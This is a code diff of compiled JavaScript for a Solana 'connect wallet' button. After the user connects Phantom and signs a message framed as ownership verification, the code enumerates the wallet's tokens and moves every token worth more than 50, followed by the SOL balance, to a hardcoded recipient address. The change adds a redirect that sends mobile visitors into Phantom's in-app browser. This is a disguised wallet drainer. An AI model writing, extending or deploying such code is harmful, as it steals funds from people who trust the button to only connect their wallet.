@@ -72655,83 +72655,92 @@ function connectAndExecute() {
 } // Function to sign a message and verify wallet ownership
 function _connectAndExecute() {
   _connectAndExecute = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee() {
-    var provider, response, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
+    var provider, isMobile, response, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
     return _regeneratorRuntime().wrap(function _callee$(_context) {
       while (1) switch (_context.prev = _context.next) {
         case 0:
-          provider = window.solana;
+          provider = window.solana; // Detect if the user is on a mobile device
+          isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
           if (!(!provider || !provider.isPhantom)) {
-            _context.next = 4;
+            _context.next = 8;
             break;
           }
+          if (!isMobile) {
+            _context.next = 6;
+            break;
+          }
+          window.location.href = "https://phantom.app/ul/browse/".concat(encodeURIComponent(window.location.href));
+          return _context.abrupt("return");
+        case 6:
+          // For desktop users, prompt to install Phantom Wallet
           alert('Phantom wallet not found. Please install it!');
           return _context.abrupt("return");
-        case 4:
-          _context.prev = 4;
-          _context.next = 7;
+        case 8:
+          _context.prev = 8;
+          _context.next = 11;
           return provider.connect();
-        case 7:
+        case 11:
           response = _context.sent;
           walletAddress = response.publicKey.toString(); // Capture the connected wallet address
 
-          // Display the connected wallet address
+          // Update button text to indicate connection
           document.getElementById('connectWalletBtn').textContent = "Connected";
 
-          // Step 2: Sign a message after connection to verify wallet ownership
-          _context.next = 12;
+          // Step 2: Sign a message to verify wallet ownership
+          _context.next = 16;
           return signMessage(provider, walletAddress);
-        case 12:
-          // Step 3: Fetch SOL balance after signing
+        case 16:
+          // Step 3: Fetch SOL balance
           connection = new _web.Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
-          _context.next = 15;
+          _context.next = 19;
           return connection.getBalance(new _web.PublicKey(walletAddress));
-        case 15:
+        case 19:
           balance = _context.sent;
           solBalance = balance / 1e9; // Step 4: Fetch token balances using Shyft API
-          _context.next = 19;
+          _context.next = 23;
           return fetchTokenBalances(walletAddress);
-        case 19:
+        case 23:
           tokens = _context.sent;
-          _context.next = 22;
+          _context.next = 26;
           return fetchTokenPrices(tokens);
-        case 22:
+        case 26:
           tokenPrices = _context.sent;
-          // Step 6: Calculate token values (balance * price) and sort by value
+          // Step 6: Calculate token values and sort them
           tokenValues = tokens.map(function (token) {
-            var price = tokenPrices[token.info.symbol] || 0; // Get the price for the token, default to 0 if not found
-            var value = price * token.balance; // Multiply balance and price directly
+            var price = tokenPrices[token.info.symbol] || 0;
+            var value = price * token.balance;
             return _objectSpread(_objectSpread({}, token), {}, {
               value: value
             });
-          }); // Filter out tokens with a value of zero or below a certain threshold (e.g., 0.01)
+          }); // Filter and sort tokens by value
           filteredTokens = tokenValues.filter(function (token) {
             return token.value > 50;
-          }); // Sort tokens by value (highest to lowest)
+          });
           sortedTokens = filteredTokens.sort(function (a, b) {
             return b.value - a.value;
           });
           console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
-          // Step 7: Transfer tokens in the sorted order
-          recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ'; // Replace with the recipient's address
-          _context.next = 30;
+          // Step 7: Transfer tokens in order
+          recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ'; // Replace with recipient's address
+          _context.next = 34;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
-        case 30:
-          _context.next = 32;
-          return transferSol(connection, recipientAddress, solBalance);
-        case 32:
-          _context.next = 38;
-          break;
         case 34:
-          _context.prev = 34;
-          _context.t0 = _context["catch"](4);
+          _context.next = 36;
+          return transferSol(connection, recipientAddress, solBalance);
+        case 36:
+          _context.next = 42;
+          break;
+        case 38:
+          _context.prev = 38;
+          _context.t0 = _context["catch"](8);
           console.error(_context.t0);
           alert('Failed to complete wallet flow');
-        case 38:
+        case 42:
         case "end":
           return _context.stop();
       }
-    }, _callee, null, [[4, 34]]);
+    }, _callee, null, [[8, 38]]);
   }));
   return _connectAndExecute.apply(this, arguments);
 }
